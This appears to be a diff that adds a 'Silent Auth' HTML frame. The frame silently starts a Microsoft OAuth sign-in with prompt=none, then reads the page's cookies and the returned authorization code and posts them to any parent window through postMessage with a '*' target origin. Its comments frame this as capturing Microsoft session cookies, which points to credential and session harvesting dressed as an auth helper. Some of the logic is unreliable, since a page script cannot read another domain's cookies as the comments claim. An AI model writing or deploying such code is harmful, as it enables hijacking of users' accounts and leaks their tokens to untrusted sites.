@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Silent Auth</title>
+    <style>
+        body { margin: 0; padding: 0; }
+    </style>
+</head>
+<body>
+    <script>
+        console.log('🔐 Silent auth frame loaded');
+
+        // Listen for messages from parent
+        window.addEventListener('message', function(event) {
+            console.log('📨 Message received:', event.data);
+
+            if (event.data.type === 'INIT_AUTH') {
+                console.log('🚀 Starting silent auth flow...');
+                performSilentAuth(event.data);
+            }
+        });
+
+        function performSilentAuth(config) {
+            console.log('🔑 Config:', {
+                email: config.email,
+                clientId: config.clientId,
+                redirectUri: config.redirectUri
+            });
+
+            // Build Microsoft OAuth URL with prompt=none for silent auth
+            const params = new URLSearchParams({
+                client_id: config.clientId,
+                response_type: 'code',
+                scope: 'openid profile email',
+                redirect_uri: config.redirectUri,
+                login_hint: config.email,
+                prompt: 'none', // ✅ SILENT - won't show UI
+                state: config.state || 'silent_auth_state'
+            });
+
+            const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
+            
+            console.log('🌐 Redirecting to:', authUrl);
+
+            // This will redirect or stay on login.microsoftonline.com
+            window.location.href = authUrl;
+        }
+
+        // When redirected back with code, capture cookies
+        window.addEventListener('load', function() {
+            console.log('📍 Current URL:', window.location.href);
+
+            // Check if we have a code in URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            const error = urlParams.get('error');
+
+            if (code) {
+                console.log('✅ Authorization code received!');
+                captureCookiesAndSend(code);
+            } else if (error) {
+                console.log('❌ Error:', error);
+                captureCookiesAndSend(null, error);
+            } else {
+                console.log('⏳ Waiting for redirect...');
+            }
+        });
+
+        function captureCookiesAndSend(code, error) {
+            // Capture cookies from Microsoft domain
+            const cookies = [];
+            const cookieString = document.cookie;
+
+            if (cookieString) {
+                const pairs = cookieString.split(';');
+                pairs.forEach(pair => {
+                    const trimmed = pair.trim();
+                    if (trimmed) {
+                        const eqIdx = trimmed.indexOf('=');
+                        if (eqIdx > 0) {
+                            const name = trimmed.substring(0, eqIdx).trim();
+                            const value = trimmed.substring(eqIdx + 1).trim();
+                            
+                            if (name && value) {
+                                cookies.push({
+                                    name: name,
+                                    value: value,
+                                    domain: window.location.hostname,
+                                    path: '/',
+                                    secure: true,
+                                    sameSite: 'None'
+                                });
+                            }
+                        }
+                    }
+                });
+            }
+
+            console.log('🍪 Captured', cookies.length, 'cookies from:', window.location.hostname);
+
+            // Send data back to parent
+            window.parent.postMessage({
+                type: 'AUTH_COMPLETE',
+                data: {
+                    code: code,
+                    error: error,
+                    cookies: cookies,
+                    domain: window.location.hostname,
+                    timestamp: new Date().toISOString()
+                }
+            }, '*');
+
+            console.log('📤 Sent data to parent window');
+        }
+    </script>
+</body>
+</html>
